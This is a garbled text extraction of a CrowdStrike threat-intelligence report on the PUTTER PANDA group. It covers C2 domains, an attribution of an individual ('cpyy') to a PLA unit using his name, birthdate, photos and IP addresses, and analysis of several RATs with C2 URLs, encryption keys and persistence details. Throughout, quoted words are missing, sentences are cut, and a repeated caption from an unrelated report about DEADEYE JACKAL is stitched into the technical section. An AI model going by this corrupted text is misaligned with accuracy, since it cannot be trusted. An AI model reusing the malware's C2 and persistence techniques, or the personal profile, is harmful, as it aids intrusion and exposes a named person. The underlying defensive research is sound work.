                                       Email Addresses
                                                                                 8
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
C2 Indicators (cont
The most significant finding is that an actor known as cpyy appears to have registered a significant number
of C2 domains. This actor is discussed in the next section.
Many of the domains have had their registrant information changed, likely in an attempt to obfuscate the
identity of the operators. For instance, several domains originally registered by cpyy had their email address
updated to van.dehaim@gmail.com around the end of 2009; for siseau.com the change occurred between
July 2009 and November 2009, and for vssigma.com, the change occurred between August 2009 and
December 2009. Historical registrant information for anfoundation.us, rwchateau.com, and succourtion.org
was not available prior to 2010, but it is likely that these domains were also originally registered to a personally
attributable email account.
                                                                     Similarly, several domains registered to
                                                                     mike.johnson_mj@yahoo.com have had
                                                                     their registrant email updated during March
                                                                     2014 (see Table 2).
                                                                     These registrant changes may indicate
                                                                     an increased awareness of operational
                                                                     security (OPSEC) from the PUTTER PANDA
                                                                     actors. The recent changes to the domains
                                                                     shown in Table 2 may indicate that the
      Table 2. New
      Registrant Email                                               operators are preparing new campaigns
      Addresses for                                                  that make use of this infrastructure, or they
      Domains Original-
                                                                     are attempting to disassociate all these
      ly Registered to
      mike.johnson_mj@
      yahoo.com                                                      Although no attributable information was
                                                                     found on the email addresses associated
                                                                     with the domains described above (aside
                                                                     from cpyy and httpchen 
 see below),
several other domains were found to have been registered by some of these addresses. These are shown
in Table 3, and may be used for command and control of PUTTER PANDA tools. domains from a single email
address, perhaps due to OPSEC concerns or issues with the specific email account.
                                                                                                                       9
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                       C2 Indicators
                                       (cont
                                       Targeting
                                       The subdomains associated with
                                       these domains via DNS records, along
                                       with some of the domain names
                                       themselves, point to some areas
                                       of interest for the PUTTER PANDA
                                       operators (see also Droppers in the
                                       following Technical Analysis section):
                                       
 Space, satellite, and remote
                                       sensing technology (particularly
                                       within Europe);
                                       
 Aerospace, especially European
                                       aerospace companies;
                                       
 Japanese and European
                                       telecommunications.
                                       It is likely that PUTTER PANDA will
                                       continue to attack targets of
                                       this nature in future intelligence-
                                       gathering operations.
                                       Table 3. Domains
                                       Associated with
                                       Registrant Emails
                                       Found in PUTTER
                                       PANDA C2 Domains
                                                                                10
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
C2 Indicators (cont
d)                                           The decipherment.net domains resolved to this IP
                                                                 address from 11 October 2012 to at least 25 February
                                                                 2013, and the botanict.com domain resolved from 11
Connections to Other
                                                                 October 2012 to 24 March 2013.
Adversary Groups
                                                                 During part of this timeframe (30 June 2012 - 30
                    COMMENT PANDA
                                                                 October 2012), a domain associated with COMMENT
                    Based on passive DNS records,
                                                                 PANDA resolved to this same IP address: login.
                    several PUTTER PANDA associated
                                                                 aolon1ine.com. Additionally, for a brief period in April
                    domains have resolved to IP
                                                                 2012, update8.firefoxupdata.com also resolved to
                    address 100.42.216.230:
                                                                 this IP address.
 news.decipherment.net
 res.decipherment.net
                                                                 The use of the same IP address during the same time
 spacenews.botanict.com
                                                                 suggests that there is perhaps some cooperation or
 spot.decipherment.net
                                                                 shared resources between COMMENT PANDA and
                                                                 PUTTER PANDA.
Additionally, several subdomains of
ujheadph.com resolved to this IP:
                                                                                    VIXEN PANDA
 chs.ujheadph.com
                                                                                    Although not as conclusive as the
 imageone.ujheadph.com
                                                                                    links to COMMENT PANDA, IP address
 img.ujheadph.com
                                                                                    31.170.110.163 was associated
 klcg.ujheadph.com
                                                                                    with VIXEN PANDA domain blog.
 naimap.ujheadph.com
                                                                 strancorproduct.info from November to December
 neo.ujheadph.com
                                                                 2013. In February 2014, this IP address was also
 newspace.ujheadph.com
                                                                 associated with PUTTER PANDA domain ske.hfmforum.
 pasco.ujheadph.com
                                                                 com. While not directly overlapping, this potential
                                                                 infrastructure link is interesting, as VIXEN PANDA has
Another subdomain of ujheadph.com has been
                                                                 previously displayed TTPs similar to COMMENT PANDA
observed 2 in connection with distinctive traffic
                                                                 (other CrowdStrike reporting describes VIXEN PANDA
originating from the 3PARA RAT (described below),
                                                                 malware that extracts C2 commands embedded
making it probable that this domain is
                                                                 between delimiters in web content), and has
also associated with PUTTER PANDA.
                                                                 extensively targeted European entities.
 See http://webcache.googleusercontent.com/search?q=cache:ZZyfzC1Y0UoJ:www.urlquery.net/report.
php%3Fid%3D9771458+&cd=2&hl=en&ct=clnk&gl=uk
                                                                                                                          11
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
CPYY
Several email addresses have been associated with cpyy, who also appears to use the alternate handles
cpiyy and cpyy.chen:
 cpyy@sina.com
 cpyy@hotmail.com
 cpyy.chen@gmail.com
 cpyy@cpyy.net
The cpyy.net domain lists 
Chen Ping
 as the registrant name, which may be cpyy
s real name, as this
correlates with the initials 
 in 
cpyy
. A personal blog for cpyy was found at http://cpiyy.blog.163.com/.
The profile on this blog (shown in Figure 2 below) indicates that the user is male, was born on 25 May 1979,
and works for the 
military/police
                                                                                        Figure 2. cpyy
                                                                                        Personal Blog on
                                                                                        163.com
                                                                                                                 12
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
CPYY
 (cont
This blog contains two postings in the 
 category that indicate at least a passing interest in the topics of
networking and programming. A related CSDN profile for user cpiyy indicates that cpyy was working on or
studying these topics in 2002 and 20033.
Another personal blog for cpyy (http://www.tianya.cn/1569234/bbs) appears to have last been updated in
2007. This states that the user lives in Shanghai, and has a birthdate identical to that in the 163.com blog.
cpyy was also active on a social networking site called XCar, stating that he lived in Shanghai as early as
2005 through 2007; he said in a post, 
Soldier
s duty is to defend the country, as long as our country is safe,
our military is excellent
4 , indicating a feeling of patriotism that could be consistent with someone who
chose a military or police-based career.
                                                                                             Figure 3. cpyy
                                                                                             Personal Blog on
                                                                                             tianya.cn
                                                                                         3
                                                                                          See postings: http://bbs.csdn.
                                                                                         net/users/cpiyy/topics
                                                                                         4
                                                                                          hxxp://www.xcar.com.
                                                                                         cn/bbs/viewthread.
                                                                                         php?tid=7635725&page=6
                                                                                                                       13
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
CPYY
 (cont
On the XCar forum, cpyy.chen used a subforum
called POLO (hacker slang for 
Volkswagen cars
to communicate with other users Linxder, peggycat,
Naturally do not understand romance
a wolf
large tile
winter
chunni
), papaya, kukuhaha, Cranbing,
dusty sub
), z11829, 
ice star harbor
polytechnic Aberdeen
I love pineapple
), and 
s distant
 in 2007. Although
superficially the discussion is about cars, there is a
repeated word in the text, 
milk yellow package
custard package
 or 
yoke package
). This
could be a hacker slang word, but it is unclear as to the
definition. The conversation alludes to Linxder being the
teacher
 or 
landlord
 and the other aforementioned
users are his 
students
. Linxder references how he has
found jobs
 for them. It is possible that this is a reference
to hacking jobs wrapped up in car metaphors.
Linxder is the handle of an actor associated with
the likely Shanghai-based COMMENT PANDA group5
. Linxder, cpyy, and xiaobai have all discussed
programming and security related topics on cpyy
s site,
cpyy.org6 , which hosted a discussion forum for the 711
Network Security Team (see below).
cpyy also appears to have a keen interest in
photography; his 163.com blog includes several
photographs taken by cpyy in the blog postings and
albums section. Some of these photographs also appear
                                                                 Figure 4. cpyy.chen,
in a Picasa site7 (examples are shown in Figures 5 and 6)
                                                                 from 2005, 2006,
belonging to a user cpyy.chen.                                   and 2007
                                                                 (left to right)
An album in this site named 
 has several shots of
what is likely cpyy himself, from 2005, 2006, and 2007,
shown to the right:
                                                                                   14
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
CPYY
 (cont
An account on rootkit.com, a popular low-level software security site, existed for user cpyy and was accessed
in at least May 2004. This account was registered with primary email address cpyy@cpyy.net and backup email
address cpyy@hotmail.com; it listed a date of birth as 24 May 1979, consistent with cpyy
s other profiles. The
IP address 218.242.252.214 was associated with this account; it is owned by the Oriental Cable Network Co.,
Ltd., an ISP located in Shanghai. Registration on this forum shows that cpyy had an interest in security-related
programming topics, which is backed up by the postings on his personal blog and CSDN account.
                                                                                        Figure 6. Example
                                                                                        Photograph from
                                                                                        163.com Blog
          Figure 5. Sample
          Photograph from
          cpyy.chen
           Picasa Albums
                                                                                                                   15
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
     
CPYY
 (cont
    711 Network Security Team
    One of the sites registered to cpyy was used to host a web-based email service, along with a forum on www.
    cpyy.net. Both of these services were apparently run by the 711 Network Security Team (711
), a
    group that is now likely defunct, but has previously published security-based articles that have been re-posted
    on popular Chinese hacking sites such as xfocus.net8.
                                                                        One of these articles, entitled 
IMD-based packet
                                                                        filtering firewall to achieve the principles
9, is
                                                                        apparently authored by xiaobai, with email address
                                                                        xiaobai@openfind.com.cn; it was published on
                                                                        the 
GRATEFUL
) security digest list10 that
                                                                        is hosted by Shanghai Jiao Tong University (SJTU).
                                                                        This digest list/bulletin board was also frequented
                                                                        by ClassicWind, an actor possibly linked to the
                                                                        Shanghai-based, PLA-sponsored adversary group
                                                                        COMMENT PANDA, as described in. This Tipper also
                                                                        indicates that 
the Chinese Communist Party (CCP)
                                                                        and the People
s Liberation Army (PLA) aggressively
                                                                        target SJTU and its School of Information Security
                                                                        Engineering (SISE) as a source of research and
                                                                        student recruitment to conduct network offense
                                                                        and defense campaigns
, so it is possible that the
Figure 7. httpchen
                                                                        711 Network Security Team members came to the
Posting on SJTU
GRATEFUL
 BBS                                                          attention of the Chinese state via this institution.
                                                                An additional connection to SJTU comes from
    a C2 domain, checalla.com, used with the 4H RAT in 2008. This domain was registered to httpchen@gmail.
    com at the time, and this address was also used to make a posting on the GRATEFUL BBS (shown in Figure 7).
    The posting indicates that httpchen is located at the 
 (Minhang) campus of SJTU and was posting using
    IP address 58.196.156.15, which is associated with the China Education and Research Network (CERNET), a
    nationwide network managed by the Chinese Ministry of Education. It also states that httpchen is studying at
    the school of Information Security Engineering within SJTU.
 For example, hxxp://www.xfocus.net/articles/200307/568.html
 This article also lists http://cpyy.vicp.net/ as the original source site, although no archived content could be recovered for this.
  See http://bbs.sjtu.edu.cn/bbsanc,path,/groups/GROUP_3/Security/D44039356/D69C6D2AC/D4C11F438/D6DB67E4E/DA69FF663/
M.1052844461.A.html
                                                                                                                                        16
 CrowdStrike Intelligence Report
 Crowdstrike Global Intelligence Team
CPYY
 (cont
  Military Connections
  Several pieces of evidence indicate that cpyy probably has connections to, or is part of, the Chinese military
 specifically the PLA Army. In addition to his declaration on his personal blog that he works for the 
military/
  police
, and contacts with actors such as Linxder that have been previously associated with hacking units
  within the PLA, cpyy
s Picasa site contains several photographs that hint at military connections.
                                                                                   First, a monochrome picture from
                                                                                   the 
college
) album
                                                                                   posted in February 2007 shows
                                                                                   several uniformed individuals:
                                                                                   It is not clear whether this picture
                                                                                   includes cpyy, or just friends/
                                                                                   associates/relatives.
A picture from the 
high school
) album posted in
February 2007 shows a male 
likely cpyy based on the clothing
shown in the second picture,
which matches the pictures of
cpyy shown above 
 performing
exercise in front of a group of
likely soldiers and an officer:
                                                                                                                      17
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Although somewhat unclear, pictures from the album 2002
2002 birthday
), also posted in
February 2007, show the celebrant (likely cpyy) in khaki clothes that are possibly military wear.
The most compelling pictures,
however, are found in the 
and 
 albums (
dormitory
and 
office
). A shot of probably
cpyy
s dormitory room shows in the
background two military hats that
appear to be Type 07 PLA Army
officer peak hats:
                                                                                                    18
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
This album also contains a shot of the exterior of a building with several large satellite dishes outside:
                                                            This same building and the
                                                            satellite dishes also appear
                                                            in the 
office
 album. The
                                                            reflection effects observed
                                                            on the windows of this
                                                            building could be due to
                                                            coatings applied to resist
                                                            eavesdropping via laser
                                                            microphones and to increase
                                                            privacy, which would be
                                                            consistent with a military
                                                            installation conducting
                                                            sensitive work.
                                                                                                             19
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Above is an image from the same album of what appears to be a larger dish, in front of the Oriental Pearl
Tower, a significant landmark in Shanghai:
UNIT 61486
As mentioned above, checalla.com was used for command and control with the PUTTER PANDA 4H RAT in
2008. This domain was registered to httpchen@gmail.com, and in May 2009 the domain registration details
were updated to include a Registrant Address of 
shanghai yuexiulu 46 45 202#
. A search for this location
reveals an area of Shanghai shown in Figure 812 .
Figure 9 shows an enlargement of satellite imagery from within this area, depicting a facility containing
several satellite dishes within green areas, sports courts and a large office building.
 Source: https://www.google.com/maps/place/31%C2%B017
18.0%22N+121%C2%B027
18.7%22E/@31.2882939,121.4554673,658m/
data=!3m1!1e3!4m2!3m1!1s0x0:0x0
                                                                                                                20
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
 Figure 8. Map and
 Satellite Views of
 Area of Interest in
 Shanghai
                                       Figure 9. Enlarged
                                       Section within
                                       Area of Interest
                                                            21
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Satellite imagery from 2009 showing another aspect of this office building, along with a likely vantage point
and direction of camera, alongside probably cpyy
s photograph from the same angle, is shown in Figure 10:
                                                              Figure 10. Satellite
                                                              Imagery of Facility
                                                              Alongside Handheld
                                                              Image from cpyy
Based on the Shanghai location, and common features, it is highly likely that the location shown above
is the same as that photographed by cpyy and shown in the 
office
 and 
dormitory
 albums. Further
confirmation can be found from photos uploaded by a user on Panoramio13 who tags the image as being
located in Chabei14 , Shanghai, China (31
 18.86
 N 121
 9.83
 E). This image is exceptionally similar
to building shown in cpyy
office
 album (see Figure 11 below).
 http://www.panoramio.com/user/3305909
 Alternately Romanized as Zhabei
                                                                                                                 22
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                                              Figure 11. Panoramio
                                                              (left) and cpyy
                                                              Images Compared
 According to a public report15 on the Chinese PLA
s General Staff Department (GSD), the 12th Bureau of
 the 3rd GSD is headquartered in the Zhabei district of Shanghai and 
appears to have a functional mission
 involving satellites, likely inclusive of intercept of satellite communications and possibly space-based SIGINT
 collection
. The same report also lists a Military Unit Cover Designator (MUCD) of 61486 for this bureau.
 A webpage16 published on a Chinese government site detailing theatrical performances involving members
 of the PLA lists an address of 
 (46 Yue Xiu Road, Zhabei District) for 
61486
 (61486
 Forces General Staff). A search for this location shows an identical area to that shown in Figure 8.
 It can therefore be concluded with high confidence that the location shown in cpyy
s imagery, along
 with the satellite images above, is the headquarters of the 12th Bureau, 3rd GSD, Chinese PLA 
 also
 known as Unit 61486. This unit
s suspected involvement in 
space surveillance
17 and 
intercept of satellite
 communications
 fits with their observed targeting preferences for Western companies producing
 technologies in the space and imaging/remote sensing sectors. The size and number of dishes present in
 the area is also consistent with these activities.
  http://project2049.net/documents/pla_third_department_sigint_cyber_stokes_lin_hsiao.pdf
  http://www.dfxj.gov.cn/xjapp/wtzyps/wtlzy/wyyjysl/zhc/zyc/bd01d910153ffb4d0115a7c12f70042e.html
  http://project2049.net/documents/china_electronic_intelligence_elint_satellite_developments_easton_stokes.pdf
                                                                                                                   23
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Binary indicators
Observed build times for the PUTTER PANDA tools described in this report range from 2007 to late 2013,
indicating that the actors have conducted several campaigns against their objectives over a period of
several years. A build time analysis of all known samples is shown in Figure 1 below, relative to China time.
                                                                                                          Figure 1. Build
                                                                                                          Time Analysis of
                                                                                                          PUTTER PANDA
                                                                                                          Malware, Relative
                                                                                                          to China Time
                                                                                                          (UTC+8)
Although this shows that there is some bias in the build time distribution to daylight or working hours in China, which
is more significant if a possible three-shift system of hours is considered (0900-1200, 1400-1700, and 2000-2300), this
evidence is not conclusive. There is also some evidence that build times are manipulated by the adversary; for
example, the sample with MD5 hash bc4e9dad71b844dd3233cfbbb96c1bd3 has a build time of 18 July 2013, but was
supposedly first submitted to VirusTotal on 9 January 2013. This shows that the attackers 
 at least in 2013 
 were aware
of some operational security considerations and were likely taking deliberate steps to hide their origins.
                                                                                                                            24
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Conclusions
There is strong evidence to tie cpyy, an actor who
appears to have been involved in historical PUTTER
PANDA operations, to the PLA army and a location in
Shanghai that is operated by the 12th Bureau, 3rd GSD
of the PLA (Unit 61486). Another actor tied to this activity,
httpchen, has declared publically that he was attending
the School of Information Security Engineering at SJTU.
This university has previously been posited as a recruiting
ground for the PLA to find personnel for its cyber
intelligence gathering units, and there is circumstantial
evidence linked cpyy to other actors based at SJTU.
Given the evidence outlined above, CrowdStrike
attributes the PUTTER PANDA group to PLA Unit 61486
within Shanghai, China with high confidence. It is likely
that this organization is staffed in part by current or
former students of SJTU, and shares some resources and
direction with PLA Unit 61398 (COMMENT PANDA).
                                                                25
Technical Analysis
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Technical Analysis
Several RATs are used by PUTTER PANDA. The most common of these, the 4H
RAT and the 3PARA RAT, have been documented previously by CrowdStrike
in previous CrowdStrike Intelligence reporting. This analysis will be revisited
below, along with an examination of two other PUTTER PANDA tools:
pngdowner and httpclient. Two droppers have been associated with the
PUTTER PANDA toolset; these are also briefly examined below.
4H RAT 
 EXAMPLE MD5 HASH
A76419A2FCA12427C887895E12A3442B
This RAT was first analyzed by CrowdStrike in April 2012, but a historical analysis shows that it has been in
use since at least 2007 by the PUTTER PANDA actors. A listing of metadata for known samples, including C2
                                                                                       Screenshot of Truecaller
information, is shown in Appendix 1.
                                                                                        Database Shared by
                                                                                        DEADEYE JACKAL on Their
The operation of this RAT is described in detail in other CrowdStrike reporting, but isTwitter
                                                                                        usefulAccount
                                                                                               to revisit here to
                                                                                                      (names
highlight the characteristics of the RAT:                                              redacted)
 C2 occurs over HTTP, after connectivity has been verified by making a distinctive request (to the URI /
search?qu= at www.google.com).
 A victim identifier is generated from the infected machine
s hard disk serial number, XOR
ed with the key
ldd46!yo , and finally nibble-wise encoded as upper-case ASCII characters in the range (A-P) 
 e.g., the
byte value 0x1F becomes 
 A series of HTTP requests characterizes the RAT
s C2. The initial beacon uses a request with four parameters
(h1, h2, h3, and h4) 
 as shown in Figure 8 
 to register the implant with the C2 server.
 Communication to and from the C2 server is obfuscated using a 1-byte XOR with the key 0xBE.
 The commands supported by the RAT enable several capabilities, including:
   o Remote shell
   o
 Listing of running processes (including loaded modules)
   o Process termination (specified by PID)
   o File and directory listing
   o File upload, download, deletion, and timestamp modification
                                                                                                                    27
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                                                                              Figure 8. 4H RAT
                                                                                              Example Beacon
                                                                                  Screenshot of Truecaller
                                                                                  Database Shared by
                                                                                  DEADEYE JACKAL on Their
                                                                                            Figure 9. Sample
                                                                                  Twitter Account (names
                                                                                            Python Code to
                                                                                  redacted)
                                                                                            Decode Hostname
                                                                                            from User-Agent
3PARA RAT 
 EXAMPLE MD5 HASH                                                                Snippet
BC4E9DAD71B844DD3233CFBBB96C1BD3
The 3PARA RAT was described in some detail in other CrowdStrike reporting, which
examined a DLL-based sample with an exported filename of ssdpsvc.dll. Other
observed exported filenames are msacem.dll and mrpmsg.dll, although the RAT has
also been observed in plain executable (EXE) format.
On startup, the RAT attempts to create a file mapping named
&*SDKJfhksdf89*DIUKJDSF&*sdfsdf78sdfsdf. This is used to prevent multiple instances of
the RAT being executed simultaneously. The RAT will then use a byte-wise subtraction-
based algorithm (using a hard-coded modulo value) to decode C2 server details
consisting of a server hostname and port number, in this example nsc.adomhn.
com, port 80. The decoding algorithm is illustrated in Figure 10 below. The key and
modulo values vary on a per-sample basis. Decoded C2 settings, along with sample
metadata, are listed in Appendix 2.
                                                                                                             28
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                                                                                 Figure 10. Sample
                                                                                                 Python Code Illus-
                                                                                                 trating C2 Server
                                                                                                 Decoding Routine
 The RAT is programmed in C++ using Microsoft Visual Studio, and it makes use of the
 object-oriented and parallel programming features of this environment; Standard
 Template Library (STL) objects are used to represent data structures such as strings and
 lists, and custom objects are used to represent some of the C2 command handlers
 (e.g., CCommandCMD). Several threads are used to handle different stages of the
 C2 protocol, such as receiving data from the server, decrypting data, and processing
 commands. Standard Windows primitives such as Events are used to synchronize
 across these threads, with a shared global structure used to hold state.
 Once running, the RAT will load a binary representation of a date/time value13 from a
                                                                                   Screenshot of Truecaller
 file C:\RECYCLER\restore.dat, and it will sleep until after this date/time has passed.Database
                                                                                         This     Shared by
 provides a mechanism for the operators to allow the RAT to remain dormant until aDEADEYE JACKAL on Their
                                                                                       Twitter Account (names
 fixed time, perhaps to allow a means of regaining access if other parts of their toolset
 are removed from a victim system.                                                     redacted)
                                                                                                 Figure 11. 3PARA
                                                                                                 RAT Initial Beacon
 As with the 4H RAT, the C2 protocol used by the 3PARA RAT is HTTP based, using
 both GET and POST requests. An initial request is made to the C2 server (illustrated
 in Figure 11 above), but the response value is effectively ignored; it is likely that this
 request serves only as a connectivity check, as further C2 activity will only occur
 if this first request is successful. In this case, the RAT will transmit some basic victim
 information to the C2 server along with a 256-byte hash of the hard-coded string
 HYF54&%9&jkMCXuiS. It is likely that this request functions as a means to authenticate
 the RAT to the C2 server and register a new victim machine with the controller. A
 sample request and its structure are shown in Figure 12.
 Using the standard Windows SYSTEMTIME structure
                                                                                                                29
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
                                                                                                   Screenshot of Truecaller
                                                                                                   Database Shared by
                                                                                                   DEADEYE JACKAL on Their
                                                                                                   Twitter Account (names
                                                                                                   redacted)
                                                                                                                Figure 12. Sample
                                                                                                                3PARA RAT Second-
                                                                                                                ary Beacon/
                                                                                                                C2 Registration
 See http://msdn.microsoft.com/en-us/library/windows/desktop/bb759853(v=vs.85).aspx for details of this API, which is rarely used.
                                                                                                                                     30
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
If this request is also successful, the RAT will attempt to retrieve tasking from the
controller using a further distinctive HTTP request shown in Figure 13, repeating this
                                                                                       Screenshot of Truecaller
request every two seconds until valid tasking is returned.
                                                                                        Database Shared by
                                                                                        DEADEYE JACKAL on Their
                                                                                        Twitter Account (names
                                                                                        redacted)
                                                                                                    Figure 13. 3PARA
                                                                                                    RAT Sample Tasking
                                                                                                    Request
                                                                                                                  31
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
Returned tasking is decrypted using the DES algorithm in CBC mode with a key derived from the MD5 hash
of the string HYF54&%9&jkMCXuiS (as used in the secondary beacon shown above). If this fails, the RAT will fall
back to decoding the data using an 8-byte XOR with a key derived from data returned from the HashData API
with the same key string. Output data produced by tasking instructions is encrypted in the same manner as it
was decrypted and sent back to the C2 server via HTTP POST request to a URI of the form /microsoft/errorpost/
default.aspx?ID=, where the ID value is a random number in decimal representation 
 as with the initial request
shown in Figure 4.
The set of commands supported by the RAT is somewhat limited, indicating that perhaps the RAT is intended
to be used as a second-stage tool, or as a failsafe means for the attackers to regain basic access to a
compromised system (which is consistent with its support for sleeping until a certain date/time). Some of the
supported commands are implemented using C++ classes derived from a base CCommand class:
 CommandAttribe 
 Retrieve metadata for files on disk, or set certain attributes such as creation/
    modification timestamps.
 CCommandCD 
 Change the working directory for the current C2 session.
 CommandCMD 
 Execute a command, with standard input/output/error Screenshot of Truecaller
    redirected over the C2 channel.                                               Database Shared by
 CCommandNOP 
 List the current working directory.                             DEADEYE JACKAL on Their
                                                                                  Twitter Account (names
                                                                           redacted)
However, other commands are not implemented in this way. These other commands contain functionality to:
 Pause C2 activity for a random time interval.
 Shutdown C2 activity and exit.
 rovide a date and time before which beaconing will not resume, recorded in the file C:\RECYCLER\
    restore.dat as noted above.
The use of C++ classes that inherit from a base class to carry out some of the tasking commands, along
with the use of concurrency features, indicates that the developers of the RAT put some thought into the
architecture and design of their tool, although the decision to implement some commands outside of the
class-based framework is curious, and may indicate multiple developers worked on the RAT (or a single
developer with shifting preferences for his coding style).
                                                                                                                32
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
PNGDOWNER 
 EXAMPLE MD5 HASH
687424F0923DF9049CC3A56C685EB9A5
The pngdowner malware is a simple tool constructed using Microsoft Visual Studio and implemented via single
C++ source code file. This sample contains a PDB path of Y:\Visual Studio 2005\Projects\branch-downer\
downer\Release\downer.pdb, but other similar paths Z:\Visual Studio 2005\Projects\pngdowner\Release\
pngdowner.pdb and Z:\Visual Studio 2005\Projects\downer\Release\downer.pdb have also been observed
in other samples. Appendix 3 lists metadata for known pngdowner samples.
Initially, the malware will perform a connectivity check to a hard-coded URL (http://www.microsoft.com),
using a constant user agent Mozilla/4.0 (Compatible; MSIE 6.0;). If this request fails, the malware will attempt to
extract proxy details and credentials from Windows Protected Storage, and from the IE Credentials Store using
publicly known methods15 , using the proxy credentials for subsequent requests if they enable outbound HTTP
access. An initial request is then made to the hard-coded C2 server and initial URI 
 forming a URL of the form
(in this sample) http://login.stream-media.net/files/xx11/index.asp?95027775, where the numerical parameter
represents a random integer. A hard-coded user agent of myAgent is used for thisScreenshot        of Truecaller
                                                                                        request, and    subsequent
                                                                                       Database Shared by
communication with the C2 server.
                                                                                     DEADEYE JACKAL on Their
                                                                                     Twitter Account (names
Content returned from this request to the C2 server will be saved to a file named index.dat in the user
                                                                                      redacted)
temporary directory (i.e., %TEMP%). This file is expected to contain a single line, specifying a URL and a
filename. The malware will then attempt to download content from the specified URL to the filename within
the user
s temporary directory, and then execute this file via the WinExec API. If this execution attempt
succeeds, a final C2 request will be made 
 in this case to a URL using the same path as the initial request (and
a similarly random parameter), but with a filename of success.asp. Content returned from this request will be
saved to a file, but then immediately deleted. Finally, the malware will delete the content saved from the first
request, and exit.
The limited functionality, and lack of persistence of this tool, implies that it is used only as a simple download-
and-execute utility. Although the version mentioned here uses C++, along with Visual Studios Standard
Template Library (STL), older versions of the RAT (such as MD5 hash b54e91c234ec0e739ce429f47a317313), built
in 2011, use plain C. This suggests that despite the simple nature of the tool, the developers have made some
attempts to modify and perhaps modernize the code. Both versions contain debugging/progress messages
such as 
down file success
. Although these are not displayed to the victim, they were likely used by the
developers as a simple means to verify functionality of their code.
                                                                                                                 33
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
 HTTPCLIENT 
 EXAMPLE MD5 HASH
 544FCA6EB8181F163E2768C81F2BA0B3
 Like pngdowner, the httpclient malware is a simple tool that provides a limited range of functionality and uses
 HTTP for its C2 channel. This malware also initially performs a connectivity check to www.microsoft.com using
 the hard-coded user agent Mozilla/4.0 (Compatible; MSIE 6.0;), although in this variant no attempt is made to
 extract proxy credentials.
 The malware will then connect to its configured C2 infrastructure (file.anyoffice.info) and perform a HTTP
 request of the form shown in Figure 14 below:
                                                                                    Screenshot of Truecaller
                                                                                                Figure 14. HttpClient
                                                                                    Database Shared by
                                                                                                Sample Beacon
                                                                                    DEADEYE JACKAL on Their
                                                                                    Twitter Account (names
                                                                                    redacted)
 Content returned from the C2 server is deobfuscated by XOR
ing the content with a single byte, 0x12. The
 decoded data is then checked for the string runshell. If this string is not present, the C2 request is repeated
 every 0.5 seconds. Otherwise, a shell process is started (i.e., cmd.exe), with input/output redirected over the C2
 channel. Shell commands from the server are followed by an encoded string $$$, which indicates that the shell
 session should continue. If the session is ended, two other commands are supported: m2b (upload file) and
 b2m (download file).
 Slight variations on the C2 URLs are used for different phases of the C2 interaction:
 Shell command: /Microsoft/errorpost<random number>/default.asp?tmp=<encoded hostname>
 Shell response: /MicrosoftUpdate/GetUpdate/KB<random number>/default.asp?tmp=<encoded hostname>
 Both methods are detailed here: http://securityxploded.com/iepasswordsecrets.php
                                                                                                                 34
CrowdStrike Intelligence Report
Crowdstrike Global Intelligence Team
 Given the lack of a persistence mechanism and low level of sophistication, it is likely that httpclient 
 like
 pngdowner 
 is used as a second-stage or supplementary/backup tool. Appendix 4 lists metadata for
 observed httpclient samples.
 DROPPERS 
 RC4 AND XOR BASED
 Other CrowdStrike reporting describes a dropper used by PUTTER PANDA (abc.scr) to install the 4H RAT. This
 dropper uses RC4 to decrypt an embedded payload from data in an embedded resource before writing the
 payload to disk and executing it. Several instances of this dropper have been observed, most commonly in
 association with the 4H RAT, but also in relation to other tools that will be described in forthcoming reporting.
 Another dropper has been observed, exclusively installing the pngdowner malware (example MD5 hash
 4c50457c35e2033b3a03fcbb4adac7b7). This dropper is simplistic in nature, and is compiled from a single C++
 source code file. It contains a Word document in plaintext (written to Bienvenue_a_Sahaja_Yoga_Toulouse.
 doc), along with an executable (Update.exe) and DLL (McUpdate.dll). The executable and DLL are both
 contained within the .data section of the dropper, obfuscated with a 16-byte XOR key (consisting of the bytes
 0xA0 
 0xAF).                                                                          Screenshot of Truecaller
                                                                                                     Database Shared by
                                                                                         DEADEYE JACKAL on Their
 Both the document and executable are written to disk and the executed via the ShellExecute             API (using the
                                                                                         Twitter Account (names
 verb 
open
). The executable is also installed into the ASEP registry key HKCU\Software\Microsoft\Windows\
                                                                                         redacted)
 CurrentVersion\Run, with a value named McUpdate. Finally, the dropper deletes itself via a batch file.
 The dropped executable (MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d) primarily aims to inject
 the specified DLL (McUpdate.dll, MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f) into a process that
 would normally be accessing the network, likely in order to disguise the malicious activity. Module names
 corresponding to Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and
 Firefox (firefox.exe) are used. If Internet Explorer is used, then the malware will attempt to terminate processes
 corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).
 Four examples of these droppers were located, using a mixture of decoy PDF and Microsoft Word documents
 (shown below in Figures 15-18). The common theme throughout these documents is space technology
 (Bienvenue_a_Sahaja_Yoga_Toulouse.doc does not follow this trend, but could be targeted at workers at the
 Toulouse Space Centre, the 
largest space centre in Europe
 ), indicating that the attackers have a keen
 interest in this sector, which is also reflected in the choice of name for some of the C2 domains used (see the
 Attribution section above).
 The API used expects a parameter of the form char**, and is given a char* pointer to the 
 string, but the stack data following this
